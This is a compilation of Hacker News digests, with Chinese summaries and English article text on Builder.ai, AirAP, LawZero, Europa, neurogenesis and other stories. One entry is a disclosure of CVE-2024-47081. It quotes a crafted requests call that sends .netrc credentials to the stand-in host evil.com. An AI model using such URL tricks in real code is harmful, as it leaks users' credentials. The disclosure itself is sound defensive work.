Bloomberg notes that these allegations initiated a cascade of investor apprehension, internal changes, and an eventual erosion of confidence. Adding to the troubles, Linas Beliūnas, Director of the financial company Zero Hash, recently exposed that Builder.ai lacked true AI, instead utilising a group of Indian developers who were merely pretending to be bots writing code.
😃 The Natasha neural network turned out to be 700 Indian programmers
The startup BuilderAI offered to write any application, like in a constructor, by selecting the necessary functions.
In reality, customer requests were sent to the Indian office, where 700 Indians wrote code…
pic.twitter.com/lYWipf63cp
— Bernhard Engelbrecht (@BernhardEngel_)
May 29, 2025
'It turns out the company had no AI and instead was just a group of Indian developers pretending to write code as AI,' he wrote in a
LinkedIn post
. Beliūnas also highlights that Duggal reportedly presented false revenue figures to investors. Remarkably, the company managed to sustain this deception for eight years.
Investor Dreams Shattered By Reality
The critical moment arrived when Viola Credit, which had provided the company with a $50 million loan in 2023, took control of $37 million (£27.33 million) from its accounts. This action rendered Builder.ai incapable of fulfilling payroll commitments or maintaining essential operations.
Manpreet Ratia informed Bloomberg that the remaining funds, held in Indian accounts, are inaccessible due to regulatory restrictions.
The Broader Impact Of Builder.ai's Collapse
The insolvency proceedings at Builder.ai mirror a rising trend of instability within AI startups. Phil Brunkard, an executive counsellor at Info-Tech Research Group, shared with Computer World that many AI companies expanded rapidly, fueled by hype, frequently without robust financial oversight or genuinely unique products.
'The Qatar Investment Authority (QIA) is one of the biggest losers in this saga. They led a $250 million (£184.68 million) funding round two years ago,' Beliūnas adds.
Competition regulators are reportedly examining Builder.ai's marketing practices, with potential implications for how AI companies present their capabilities to investors and customers.
The scandal serves as a stark reminder that whilst artificial intelligence continues advancing rapidly, human expertise remains irreplaceable in many complex technical domains—a lesson that Builder.ai learned through public humiliation rather than honest business practices.
As the dust settles, the tech industry faces uncomfortable questions about transparency, accountability, and the ethical boundaries of AI marketing in an increasingly sceptical marketplace.

• dang区分了两种指控：无聊的指控是公司通过循环交易夸大销售，这与最近的报道一致；耸人听闻的指控是公司的AI产品实际上是“印度人假装是机器人”，但此指控缺乏证据支持。
• fazkan认为开发一个应用程序构建器并不困难，并以自己团队在两周内完成类似项目为例，质疑Builder.ai如何获得如此巨额投资。
• ManBeardPc表示在2019年对Builder.ai进行尽职调查时，很快就发现其存在问题，但公司仍能筹集到超过5亿美元的资金。
• Ancalagon认为在当前AI技术如此发达的情况下，出现这样的情况非常奇怪。
• perryh2提到类似的案例，如EvenUp，也涉及AI错误和幻觉问题。
• LeicaLatte幽默地指出这可能是“做不 scale 的事情”的一个极端例子。
• tartoran关心公司从投资者那里筹集到的资金的去向，是否被浪费或私吞。
• Havoc指出公司可能一直以混合模式为目标，而非纯AI，但目前因舆论焦点在“印度人假装是机器人”上，难以判断。

补充讨论：
• 评论中多次提到Builder.ai的商业模式和其AI产品的真实性问题。
• 争议焦点在于公司是否通过不正当手段夸大销售业绩，以及其AI技术的真实性。
• 部分评论提供了相关新闻链接和案例，帮助更好地理解事件背景。
• 对公司巨额资金去向的质疑也是讨论的重点之一。

data.title: Scientific Publishing: Enough Is Enough
data.author: lentoutcry
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：科学出版过程中的时间问题、负面结果的发表困难以及科学界的激励机制和障碍

不同观点：
• [gus_massa] 提到科学出版的时间周期存在学科差异。在物理学领域，从投稿到发表大约需要3个月，而在数学领域，审稿过程可能长达18个月甚至更久。他指出了不同学科的审稿速度差异。

• [y-curious] 认为科学出版中存在“没有负面结果的期刊”这样的偏见，强调如果研究者没有取得突破性进展，就很难发表文章，而这直接影响到他们的职业生存。他还批评了科学界的政治化问题，指出在科学成功的道路上，不仅需要科研能力，还需要政治技巧。

• [jltsiren] 批评了原文作者的观点，认为其观点更像是出自一个行政人员，而不是一线科学家。他指出科学进步依赖于个人信念，而非机构和激励机制。此外，他认为原文中的一些说法以偏概全，比如关于作者支付文章处理费用的讨论，以及科学出版仅关注结果而不是论证过程的观点。

补充讨论：
• 争议的焦点之一是科学出版过程中的时间问题及其对科研工作的影响。不同学科的审稿周期差异显著，这一问题在讨论中被突出。
• 另一个争议点是负面结果的发表困难，这涉及到科学界的发表激励机制，以及这种机制如何影响研究者的职业发展。
• [jltsiren] 对原文中的一些泛泛而论提出质疑，强调科学界的多样性和复杂性，指出并非所有领域都遵循相同的出版规则和激励机制。
• 科学界的政治化问题也被提及，[y-curious] 认为这是科学成功的一个重要因素，而[jltsiren] 则更强调个人信念和自主性的重要性。

总结：讨论围绕科学出版的时间周期、负面结果发表的困难以及科学界的激励机制和政治化问题展开，参与者从各自的经验和观察出发，提出了不同的看法和批评。

data.article_summary: AirAP 是一个由 neon443 开发的完全原生的 AirPlay 服务器，使用 Swift 编写，适用于 iOS。它允许用户将 iPhone 作为 AirPlay 接收器，从 Mac、Apple TV 或其他 iOS 设备流式传输音频到 iPhone。这在一些场景下非常有用，比如深夜工作时将 Mac 音频通过 iPhone 耳机输出，或在多房间音频设置中包含 iPhone。安装 AirAP 需要通过 TestFlight 链接进行下载，并确保设备连接到同一 Wi-Fi 网络。
data.comments_summary:
主要讨论点：用户对新AirPlay功能的应用场景、技术实现及潜在限制的讨论。

不同观点：
• [LowResHusband] 关注该功能是否适用于视频流，特别是从视频编辑软件AirPlay到iPhone上检查颜色和外观效果的场景。
• [bound008] 对该功能在音频分享方面的增强表示赞赏，尤其是可以分享到两副以上的耳机、扩展覆盖范围以及实现无损音频传输，同时提到曾考虑过使用esp32，但更喜欢现有的解决方案。
• [whycome] 关注该功能在旧设备上的兼容性，特别是将旧手机变成AirPlay接收器的可能性，并指出iOS 17是最低要求。

• [planetpluta] 提到很多应用已经支持将AirPlay同时传输到多个设备，并设想将该功能用于多部iPhone同时播放音乐的场景。

use your iphone as an airplay receiver
made by neon443
testflight
AirAP is a fully native AirPlay server, written in Swift, for iOS. Essentially, AirAP allows you to use your iPhone as an AirPlay receiver in iTunes or on your Mac, meaning that you can use your iPhone to play your device's sound.
What's AirAP?
Have you ever wanted to stream audio from your Mac, Apple TV, or another iOS device to your iPhone? AirAP makes this possible by implementing a full AirPlay server that runs natively on iOS. Once installed, your iPhone will appear as an available AirPlay destination in iTunes (including the Windows version), Music app, or any other AirPlay-compatible application.
The concept might seem backwards at first - after all, we're used to streaming from our iPhones to other devices. But there are surprisingly many scenarios where you'd want to do the reverse. Maybe you're working on your Mac late at night and want to route the audio to your iPhone with headphones so you don't disturb anyone (hi 👋). Perhaps you're a developer testing audio applications and need to quickly switch between different output devices. Or maybe you just want to include your iPhone in a multi-room audio setup alongside your other AirPlay speakers.
Installing AirAP
To try it out,
open this TestFlight link
, install AirAP, and follow the instructions. After installation, simply launch AirAP and ensure your iPhone is connected to the same Wi-Fi network as the device you want to stream from. Your iPhone will automatically appear in AirPlay device lists, ready to receive audio - if it doesn't, try restarting the app.

alfred-gcp-workflow
An Alfred workflow that lets you instantly open Google Cloud services or search GCP resources—fast, simple, and right from your Alfred.
Requirements
Alfred 3+
(with Powerpack)
Google Cloud CLI
installed and authenticated
Installation
Make sure you have the
Google Cloud CLI
installed and authenticated.
Download the latest release from the
releases page
.
Double-click the downloaded
.alfredworkflow
file to install it in Alfred.
Follow the instructions in the workflow to set up your gcloud binary path and you are good to go!
🆘
Still stuck?
Read the full installation guide
for step-by-step help.
✨ Features at a Glance
🔍 Fuzzy search across 250+ Google Cloud services and subservices
🔍⚡️ Search live GCP resources across 20+ services, right from Alfred
⚡ Instantly copy, paste or open GCP Console links without touching your browser
🧠 Config and region overrides using simple symbols (
@
and
$
)
🔐 Secure by design, uses your local
gcloud
CLI, never touches credentials
💾 Fast performance with safe caching (customizable via env var)
🛠️ Built-in tools to install new updates, clear cache, view logs, or reset internal data
Design Philosophy
This workflow never sees your credentials, authentication is handled entirely by the
gcloud
CLI.
Only non-sensitive data is cached, such as project names, regions, resource names etc. Jusk enough keep things snappy.
Every command fetches only the non sensitive data it needs, keeping it lightweight and efficient.
Set your
gcloud
path once, and the workflow runs smoothly without surprises.
If you notice anything that doesn't align with this, it's unintentional, please open an issue 🙏
Usage
Open Alfred and type
gcp
to see the available services and commands.
The home page will display useful links to Google Cloud:
Example: Home screen with quick links to GCP Console, Health Status, tools etc.
Type
gcp
followed by a service name.
Example:
gcp comp
will fuzzy-match and show services like Compute Engine.
If a service has 🗂️ in its subtitle,
Tab
to autocomplete into the subservices section.
You can filter subservices directly by typing their name.
Example: Typing
gcp compute inst
will fuzzy-match and show subservices like instances for Compute Engine.
If a subservice has 🔍⚡️ in its subtitle, it supports
resource search
.
Example: after typing
gcp compute
,
Tab
into
instances
to list all instances in your project.
See full list of searchable resources.
The workflow uses your currently active gcloud configuration by default.
To override it, type
@
in your query to list and
Tab
to select the desired configuration.
To override specific region, type
$
in your query to list and
Tab
to select the desired region.
⚠️
Heads up about regions
Not all services support all regions. The workflow checks if the selected region is supported by the searcher
before
calling
gcloud
, so you'll get immediate feedback instead of a failure.
Some resources are
global
, meaning they aren't tied to a region or zone. Selecting a region won't affect those results.
Examples of global resources:
Compute snapshots
Compute instance templates
Pub/Sub topics and subscriptions
This is not an exhaustive list: if changing the region has no effect, the resource is likely global.
Advanced Usage
Type
gcp tools:
to list the maintenance options powered by
AwGo Magic Actions
.You can use
Tab
to navigate between actions like clearing the cache, viewing logs, or resetting internal data folders, then press
Enter
to run the selected action.
Example: Maintenance tools screen with options like clear cache and view logs.
The workflow supports
Fuzzy Filtering
, so you can quickly find services or resources, even with partial or out-of-order matches.
By default, resource searches are cached for 7 days. To customize this duration, set the

data.title: CVE-2024-47081: Netrc credential leak in PSF requests library
data.author: jupenur
data.article_summary: 文章报告了PSF requests库中的一个安全漏洞（CVE-2024-47081），该漏洞由于错误的URL处理，可能在特定条件下将.netrc凭据泄露给第三方。触发漏洞的API调用示例为`requests.get('http://example.com:@evil.com/')`，如果.netrc中配置了example.com的凭据，它们会被泄露给evil.com。该问题根源在于库中的特定代码段，已于2024年9月12日报告给维护者，但尚未修复。作为临时解决方案，用户可以在每次API调用时明确指定凭据以禁用.netrc访问。
data.comments_summary:
主要讨论点：Python的requests库中一个漏洞被披露，特别是关于自动从`.netrc`文件中读取凭证并泄露的问题。

不同观点：
• Daviey认为Full Disclosure过程起了作用，补丁已经合并，但也指出自己的项目无意中暴露了凭证，强调即使代码未引用`.netrc`文件，requests库也会自动使用其中的凭证，这是一个安全隐患。
• janzer指出该漏洞相对小众，但考虑到requests库的广泛使用和官方维护背景，令人担忧的是漏洞报告后没有立即修复，增加了风险暴露的时间。
• woodruffw质疑实际影响的范围，提出疑问，使用`.netrc`文件的用户比例可能不高，并认为URL解析问题确实存在，但实际危害可能有限。
• awoimbee批评了urllib库的URL解析功能，指出其设计不合理，并认为这是导致漏洞的原因之一。
• audiodude表示对`.netrc`文件不熟悉，并提供了一个学习链接，暗示对该文件的使用缺乏广泛认知。
• zx8080对提交修复的注释进行了幽默评论，但没有深入讨论技术细节。
• pixl97提供了一个具体的代码示例，展示了如何在特定情况下泄露凭证，说明了漏洞的实际利用方式。
• dcrazy仅引用了janzer的话，强调漏洞报告后没有立即修复的问题，没有进一步阐述。

补充讨论：
- 争议的焦点在于漏洞的实际影响范围，特别是`.netrc`文件的普遍使用程度。
- 另一个讨论点是URL解析的复杂性和潜在的安全隐患，尤其是不同库之间的解析差异。
- 时间线和修复的延迟也是讨论的一个重要方面，突显了在开源项目中快速响应漏洞的必要性。

Full Disclosure

CVE-2024-47081: Netrc credential leak in PSF requests library
From
: Juho Forsén via Fulldisclosure <fulldisclosure () seclists org>
Date
: Sat, 31 May 2025 06:30:50 +0000
The PSF requests library (
https://github.com/psf/requests
&
https://pypi.org/project/requests/
) leaks .netrc
credentials to third parties due to incorrect URL processing under specific conditions.
Issuing the following API call triggers the vulnerability:
requests.get('
http://example.com:@evil.com/'
;)
Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.
The root cause is
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245
The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available.
CVE-2024-47081 has been reserved by GitHub for this issue.
As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.

https://nmap.org/mailman/listinfo/fulldisclosure

data.title: Yoshua Bengio Launches LawZero: A New Nonprofit Advancing Safe-by-Design AI
data.author: WillieCubed
data.article_summary: Yoshua Bengio推出非营利组织LawZero，致力于研发安全优先的人工智能（AI）系统。该组织汇集了全球顶尖的AI研究人员，旨在解决当前前沿AI模型出现的危险能力，如欺骗和目标错位等问题。LawZero采用一种名为Scientist AI的新模型，该模型为非代理型AI，注重理解世界而非行动，以确保安全和透明。该组织得到了多个机构和个人的支持，包括Future of Life Institute和Open Philanthropy等。LawZero的目标是将AI作为全球公共资源，安全地促进人类繁荣。

Yoshua Bengio Launches LawZero: A New Nonprofit Advancing Safe-by-Design AI
06 03 2025
Montréal, QC - June 3, 2025
- Yoshua Bengio, the most-cited artificial intelligence (AI) researcher in the world and A.M. Turing Award winner, today announced the launch of LawZero, a new nonprofit organization committed to advancing research and developing technical solutions for safe-by-design AI systems.
LawZero is assembling a world-class team of AI researchers who are building the next generation of AI systems in an environment dedicated to prioritizing safety over commercial imperatives. The organization was founded in response to evidence that today’s frontier AI models are developing dangerous capabilities and behaviours, including deception, self-preservation, and goal misalignment. LawZero’s work will help to unlock the immense potential of AI in ways that reduce the likelihood of a range of known dangers associated with today’s systems, including algorithmic bias, intentional misuse, and loss of human control.
LawZero is structured as a nonprofit organization to ensure it is insulated from market and government pressures, which risk compromising AI safety. The organization is also pulling together a seasoned leadership team to drive this ambitious mission forward.
“LawZero is the result of the new scientific direction I undertook in 2023, after recognizing the rapid progress made by private labs toward Artificial General Intelligence and beyond, as well as its profound implications for humanity,” said Yoshua Bengio, President and Scientific Director at LawZero. “Current frontier systems are already showing signs of self-preservation and deceptive behaviours, and this will only accelerate as their capabilities and degree of agency increase. LawZero is my team’s constructive response to these challenges. It’s an approach to AI that is not only powerful but also fundamentally safe. At LawZero, we believe that at the heart of every AI frontier system, there should be one guiding principle above all: The protection of human joy and endeavour.”
Scientist AI: a new model for safer artificial intelligence
LawZero has a growing technical team of over 15  researchers, pioneering a radically new approach called
Scientist AI
, a practical, effective and more secure alternative to today’s uncontrolled agentic AI systems. Scientist AI stands apart from the approaches of frontier AI companies, which are increasingly focused on developing agentic systems. Scientist AIs are non-agentic and primarily learn to understand the world rather than act in it, giving truthful answers to questions based on transparent externalized reasoning. Such AI systems could be used to provide oversight for agentic AI systems, accelerate scientific discovery, and advance the understanding of AI risks and how to avoid them.
Major institutions and individuals, including the
Future of Life Institute
, Jaan Tallinn,
Open Philanthropy
,
Schmidt Sciences
, and
Silicon Valley Community Foundation
have made donations to the project as part of its incubation phase.
About LawZero
LawZero is a nonprofit organization committed to advancing research and creating technical solutions that enable safe-by-design AI systems. Its scientific direction is based on new research and methods led by Professor Yoshua Bengio, the most cited AI researcher in the world. Based in Montréal, LawZero’s research aims to build non-agentic AI that could be used to accelerate scientific discovery, to provide oversight for agentic AI systems, and to advance the understanding of AI risks and how to avoid them. LawZero believes that AI should be cultivated as a global public good—developed and used safely towards human flourishing. LawZero was incubated at
Mila - Quebec AI Institute
, a non-profit founded by Professor Bengio. Mila now serves as LawZero’s operating partner.

data.title: When the sun dies, could life survive on the Jupiter ocean moon Europa?
data.author: amichail
data.article_summary: 新研究表明，当太阳进入红巨星阶段时，太阳系外侧冰卫星可能出现生命存活的狭窄机会。虽然太阳会吞噬水星和金星，并摧毁地球，但其宜居带可能会扩展至木星轨道。木星的气态性质使其本身不宜居，但其冰卫星（如木卫二欧罗巴）可能因获得更多热量而具备生命存在的条件。研究指出，欧罗巴的冰壳将升华，地下海洋会蒸发，但在某些纬度的水汽大气可能维持约2亿年，为生命提供潜在避难所。未来的詹姆斯·韦伯太空望远镜或计划中的宜居世界观测台或能帮助探测这些卫星的大气特征，扩大我们寻找外星生命的范围。
data.comments_summary:
主要讨论点：应对太阳进入红巨星阶段时地球的生存问题及人类未来的生存策略。

不同观点：
• [kragen] 提出可以通过将地球移到距离太阳更远的轨道来避免被太阳吞噬。他计算了移动地球所需的能量，并认为在未来5亿年内解决这个问题是可行的。他还讨论了木星可能对新轨道造成的扰动，并提出极端情况下可以去除木星。
• [hinkley] 认为如果人类到太阳变成红巨星时仍需依赖太阳系生存，那人类理应灭绝。他认为 nostalgia 不足以支撑数十亿年的依恋，未来的人类可能会对离开太阳系感到庆幸。
• [whycome] 认为地球生命会在其他星球上繁衍，智能生物会寻找类似木星卫星周围的生存条件，并思考生命是否存在于其他地方。
• [justforfunhere] 关注太阳膨胀的时间尺度，询问从太阳外层大气膨胀到地球被吞噬的具体时间。
• [watersb] 以幽默方式提到只要有液态水，就会有霉菌，并调侃探索新世界的代价。
• [WalterBright] 指出 Europa 上的辐射会很快致命，暗示该卫星不适合人类生存。
• [krunck] 提出在太阳吞噬地球之前，可能会有路过恒星让人类或其后代迁移到其行星上。
• [MrGuts] 和 [darkteflon] 都认为 Europa 上的生命能在太阳死亡后存活，暗示其作为人类未来避难地的潜力。
• [quantadev] 强调没有太阳，行星自身无法生成能量，只能逐渐散热至接近绝对零度，认为失去太阳后生存极为困难。
• [kwoff] 引用了论文，指出地球可能在10亿年内因去氧作用而不适合生存，早于太阳吞噬地球的时间。

补充讨论：
- 争议焦点在于如何应对太阳红巨星化及地球未来的生存策略。一些人提出技术解决方案如移动地球或迁移到其他恒星系统，另一些人则对人类适应新环境的能力表示怀疑。
- 讨论中涉及木星和Europa作为潜在的生存选择，但Europa上的高辐射问题被指出。
- 时间尺度也是一个讨论重点，有人关心太阳膨胀的具体时间，也有人提到地球环境在太阳吞噬之前就会变得不适合生存。

44173377.article_content:
Jupiter's moon Europa as seen by NASA's Juno spacecraft during a close flyby on Sept. 29, 2022.
(Image credit: NASA)
Can life survive in the solar system once the sun dies and becomes a red giant star? New research suggests there may be a narrow window of possibility for life to persist on the icy moons of the outer solar system.
It's not exactly clear where the habitable zone of the red giant sun will be, but it could possibly reach the orbit of
Jupiter
. Although the planet itself won't be habitable because it will still be a giant ball of hydrogen and helium gas,
Jupiter's moons
might become promising homes for life.
That's according to researchers at the Carl Sagan Institute at Cornell University, who reported the theory in a paper
accepted for publication
in the journal Monthly Notices of the Royal Astronomical Society.
You may like
Alien life could survive on Earth-like planets circling dead stars, study suggests
'Eventually, all life on Earth will be destroyed by the sun': Elon Musk explains his drive to colonize Mars
How rare are inhabited worlds in the universe? The 'LIFE' space telescope fleet could find out
In about 4.5 billion years, the
sun
will enter the final phase of its life. Its core of hydrogen fusion will expand and, in doing so, inflate the outer atmosphere of the star into gross proportions. It will swell and become a
red giant star
that will engulf
Mercury
and
Venus
and incinerate Earth. In the best-case scenario, all that will remain of our planet will be a lump of smoldering iron and nickel. In the worst-case scenario, it will be obliterated.
The sun's
habitable zone
— the band where the influx of radiation is just right to support liquid water on the surface of a planet — will steadily march outward as the sun begins this new phase of life.
Jupiter's ice-covered moon
Europa
will get a lot of heat. Not only will the giant sun be bearing down on it, but Jupiter itself will become hotter and reflect more sunlight, which will provide its own source of heat to the little moon. The researchers found that the icy outer shell will sublimate and the oceans underneath will evaporate. The most sublimation will occur on the side of Europa facing Jupiter because it will receive the most heat. And because of circulation and convection, the equatorial bands that face opposite Jupiter will also suffer significant water loss.
An illustration of NASA's Europa Clipper probe above Jupiter's icy moon Europa. The spacecraft launched on Oct. 14, 2024 and will arrive at Europa in April 2030.
(Image credit: NASA/JPL-Caltech)
RELATED STORIES:
—
Good news for the alien life hunt: Buried oceans may be common on icy exoplanets
—
Jupiter's ocean moon Europa may have less oxygen than we thought
—
10 weird water worlds in the solar system and beyond
However, northern and southern latitudes on the anti-Jupiter side of Europa will have a more modest rate of water loss. The researchers found that this could provide a tenuous atmosphere of water vapor that could persist for up to 200 million years. That's a blink of an eye compared with the opportunities life has had to thrive on Earth — but it's not nothing, and Europa may become the home for any life that remains in the solar system in that deep future.

The researchers also found that we might be able to find biosignatures on (formerly) icy moons around red giant stars. We have yet to have any confirmed detections of exomoons, but there are several promising candidates. Future observations with the
James Webb Space Telescope
or the planned
Habitable Worlds Observatory
might have the resolving power to examine the atmospheric features of these moons. Although it might be an unlikely scenario to find life, it does widen the possible locations for our search, as there may yet be refuges around stars that are nearly dead.

44173377.article_summary: 新研究表明，当太阳进入红巨星阶段时，太阳系外侧冰卫星可能出现生命存活的狭窄机会。虽然太阳会吞噬水星和金星，并摧毁地球，但其宜居带可能会扩展至木星轨道。木星的气态性质使其本身不宜居，但其冰卫星（如木卫二欧罗巴）可能因获得更多热量而具备生命存在的条件。研究指出，欧罗巴的冰壳将升华，地下海洋会蒸发，但在某些纬度的水汽大气可能维持约2亿年，为生命提供潜在避难所。未来的詹姆斯·韦伯太空望远镜或计划中的宜居世界观测台或能帮助探测这些卫星的大气特征，扩大我们寻找外星生命的范围。

data.title: Can adults grow new brain cells?
data.author: bookofjoe
data.article_summary: 文章主要讨论了神经生成（neurogenesis），即新神经细胞的生成，是否在人类成年后仍然发生。传统观点认为，人类大脑的神经细胞在成年之前就已形成，之后不会新增。但近年研究表明，成年鼠的大脑海马体和亚脑室区等区域仍能生成新神经元，且环境刺激和运动能促进这一过程。然而，这些发现是否适用于人类尚不明确，因为用于动物实验的方法（如注射示踪分子）不能直接用于人类。一些研究通过分析癌症患者的脑组织，发现人类成年后仍可能生成新神经元，例如1998年《Nature Medicine》和2013年《Cell》上的研究。总体而言，关于成年人类神经生成的证据尚在积累，仍存在争议。
data.comments_summary:
主要讨论点：成人神经生成（neurogenesis）的有效性、影响因素及其潜在应用

不同观点：
• [aatd86] 提出狮子鬃菌和桑拿是否能促进神经生成的问题，表明对这些方法的功效存在疑问。
• [robwwilliams] 认为成人神经生成问题复杂，涉及脑区、神经元类型和变化率等多个量化问题。引用了Pasko Rakic的研究，强调在成年灵长类动物中神经生成的水平极低，并指出现实和潜力是不同的概念。
• [esseph] 提到psilocybin（裸盖菇素）对神经生成的剂量依赖效应，低剂量增加而高剂量减少神经生成，基于小鼠研究。
• [cantalopes] 提到迷幻药如LSD被研究发现可能增加神经可塑性。
• [bloqs] 指出成人神经生成减缓与出错风险有关，并提到在极端情况下（如极度饥饿时）大脑有强大的生长机制，引用Huberman的讨论。
• [mdp2021] 提到Brant Cortright的《Neurogenesis Diet and Lifestyle》一书，认为其中包含有价值的信息。
• [anitil] 提到《The Studies Show》播客的一集讨论了类似内容，包括碳14的研究。
• [sinenomine] 认为成人神经生成的答案很可能是否定的，但基因组和局部细胞环境是可塑的，可能通过某些分子信号组合来诱导。
• [teyc] 提出电路比细胞区域更重要的观点，认为神经生成的研究问题可能 irrelevant（不相关）。
• [zerealshadowban] 提到孕妇体内新脑细胞从胎儿迁移的现象，暗示神经生成的其他途径。

补充讨论：
• 争议的焦点在于成人神经生成的实际发生程度及其影响因素，特别是在人类中的证据不足。
• 各种方法（如狮子鬃菌、桑拿、迷幻药）对神经生成的潜在影响存在不同看法和证据。
• 讨论中引用了多项研究和文献，显示出对神经生成机制和应用的复杂性理解。
• 一些评论强调了神经生成与神经可塑性、电路变化等其他神经科学概念的区别和联系。

44174540.article_content:
"Neurogenesis," or the formation of new neurons, is known to take place before birth. But some evidence suggests that it can continue throughout the human lifespan.
(Image credit: CHRISTOPH BURGSTEDT/SCIENCE PHOTO LIBRARY via Getty Images)
The developing
human brain
gains billions of neurons while in the womb, and tacks on some more during childhood. For most of the 20th century, the conventional wisdom was that the brain cells grown before adulthood would be the only ones we would have for the rest of our lives. But over the past few decades, more and more research is challenging that belief.
So is it actually possible for adults to grow neurons? While some experts believe there's strong evidence that we can gain brain cells after childhood, others are still skeptical of this notion.
The process of creating new brain cells is called neurogenesis. Researchers first observed neurogenesis after birth in lab animals of various ages, including mice,
rats
and
songbirds
. In adult mice, they found new neurons growing in parts of the brain collectively called the
subventricular zone
, an area closely linked with sense of smell, as well as in the
hippocampus
, a structure that’s central to memory.
You may like
Silent X chromosome genes 'reawaken' in older females, perhaps boosting brain power, study finds
'Let's just study males and keep it simple': How excluding female animals from research held neuroscience back, and could do so again
Evidence refuting free will is being misinterpreted, scientists argue
Researchers think that neurogenesis in these brain regions is important for plasticity, or the brain's ability to adapt and change over time. Plasticity underlies the ability to learn and form memories, for instance.
In mice, it's clear that lifestyle factors such as living in a
stimulating environment
and
exercising
can promote the growth of new neurons. Conversely, in mouse models of diseases like
Alzheimer's
, neurogenesis is hampered. What's still up for debate is whether these findings extend beyond mice and other lab animals.
Neurogenesis in human adults?
"Most of our knowledge about adult neurogenesis came from studies in animal models,"
Hongjun Song
, a professor of neuroscience at the University of Pennsylvania Perelman School of Medicine, told Live Science in an email. "Whether such knowledge can be directly translated to human studies is a challenge."
That's because many of the studies that have established the existence of adult neurogenesis in animals used methods that aren't possible in human studies, such as injecting tracer molecules into the brain. These methods enable scientists to visualize if and where new neurons are growing, but the tracers themselves can be toxic. These methods also require dissecting the brain after the animal has been euthanized.

"Unfortunately, there is no way to measure neurogenesis in the living person yet,"
Gerd Kempermann
, a professor of genomics of regeneration at the Center for Regenerative Therapies in Dresden, Germany, told Live Science in an email.
Related:
Is there really a difference between male and female brains? Emerging science is revealing the answer.
There are, however, some rare cases in which scientists have been able to apply similar methods to track neurogenesis in humans. For example, the tracer molecules used in animal neurogenesis studies are also sometimes used by doctors to track tumor growth in patients with brain cancer. While these tracer molecules are too toxic to give to healthy people, their benefits outweigh their risks in patients who already have cancer.
Scientists behind a 1998 study published in the journal
Nature Medicine
used this approach and analyzed the brains of cancer patients after their deaths. They reported that, in addition to flagging cancer cells, the tracer molecules had marked new neurons in the hippocampus. This finding suggested that humans could grow new neurons well into adulthood, given the patients were 57 to 72 years old.
Later, a 2013 study in the journal
Cell
used a form of
radiocarbon dating
to look for new neurons in humans. Radiocarbon dating usually determines the age of a sample by comparing the relative proportion of two different forms of carbon, or carbon isotopes, called carbon-14 and carbon-12. But to study neurogenesis in humans, scientists instead looked at carbon-14 concentrations inside the DNA of cells.
Their approach took advantage of the fact that there was a
spike in carbon-14 levels
in the atmosphere caused by nuclear bomb tests in the 1950s and 1960s. People's bodies absorbed this carbon-14 via their diets, and it became incorporated into their DNA. The amount of carbon-14 in a given cell corresponds to the isotope's concentrations in the atm

data.article_summary: 这篇文章介绍了一个在线工具，可以将文字转换为ASCII艺术图案。用户输入对象名称后，系统会生成对应的艺术图案。文章展示了多个示例，如"kozy"、"art"、"key"、"potato t-rex"、"cat"、"penis"、"car"、"house"等，并提供了相应的ASCII图案和复制功能。部分输入可能无法生成结果，如"cat"。文章还显示了最近创建的图案和一个受欢迎的"potato t-rex"图案。
data.comments_summary:
主要讨论点：用户对ASCII艺术生成网站的看法和使用体验

不同观点：
• [dmd] 对ASCII艺术生成网站的价值表示怀疑，认为这些网站提供的简短提示并没有特别的吸引力，用户自己也可以轻易输入类似的内容。
• [cadamsdotcom] 对ASCII艺术生成持积极态度，并提出可以通过迭代生成多帧ASCII艺术来创建简单的动画，认为这种创意很有趣。
• [dwaltrip] 分享了一个生成的具体例子（飞行的房子），并对生成结果表示好奇和惊喜，尽管结果有些不寻常（如披萨派变成了飞行房子）。
• [mysterydip] 对生成结果的准确性提出质疑，指出标签和图像内容不匹配的问题（如将史瑞克脸标记为皮卡丘，柱子标记为风车）。
• [Simorgh] 对生成ASCII艺术的技术实现表示赞赏，认为利用模型生成ASCII艺术是一种 clever（聪明）的做法。
• [shibeprime] 对生成结果的随机性和趣味性表示欣赏，但同时通过一个具体的例子（Bambi）暗示了生成内容可能有些不合逻辑或滑稽。

补充讨论：
• [4m1rk] 关注技术实现，指出ASCII艺术生成是使用FastAPI和HTMX创建的，提供了技术细节。
• [Ayushmishra23] 简单表达了对ASCII艺术生成结果的赞赏，仅用了"cool"一词。
• [b0dhimind] 分享了一个具体的ASCII艺术例子，展示了生成结果的视觉效果，未做具体评价。

争议焦点：
• ASCII艺术生成结果的准确性和实用性是争议的主要焦点。一方面，[mysterydip]指出了图像与标签不匹配的问题；另一方面，[Simorgh]和[shibeprime]等人对生成技术的创意和趣味性表示赞赏。

总结：
讨论围绕ASCII艺术生成网站的吸引力、技术实现和生成结果的准确性展开。用户对生成结果的评价不一，有的对其创意和技术表示赞赏，有的则对其准确性和实用性提出质疑。技术实现细节和生成结果的具体例子也成为了讨论的一部分。

data.title: Ask HN: What's with the repeated job posts on "Who's hiring"?
data.author: rafavento
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：技术招聘中反复发布职位广告的现象及其背后的原因和影响

不同观点：
• **反复发布广告是为了吸引更多高级开发者**：ElCapitanMarkla表示，他们的公司每个月都重新发布高级开发者的招聘广告，目的是吸引更多的应聘者，并且已经成功雇佣了几位通过该广告应聘的开发者。

• **拒绝多数候选人是因为坚持高标准**：samcheng指出，尽管他们拒绝了大多数候选人，但这并不意味着找不到合适的，而是因为他们坚持高标准，并希望找到最合适的员工。

• **招聘过程中的“独角兽”现象**：TheMongoose提到，有些公司寻找“独角兽”候选人（各方面都完美的候选人），这可能导致职位反复被重新发布。TheMongoose自己曾被拒，而后看到同一职位再次发布。

• **申请人质量参差不齐**：thatguysaguy分享了自己的经验，作为求职者通过此类帖子找到了工作，但作为招聘方却发现大多数申请人的质量并不高。这可能导致招聘方对求职者失去耐心和信任。

• **招聘非软件技能的困难**：thwaway指出，在寻找具有非软件技能（如数学、物理、工程等）的候选人时，通过“谁在招聘”帖子获得的合格申请人很少，且遇到了一些不合适的候选人，甚至有人因为不合适而感到被冒犯。

• **招聘方在联系后失联**：prmph提到，有些招聘方要求候选人直接联系他们，但随后却“失联”，不再回应。

• **立法干预招聘过程的必要性**：tslocum认为，反复发布同一职位广告的现象需要立法干预，以保护求职者的权益，因为寻找技术工作已经非常困难。

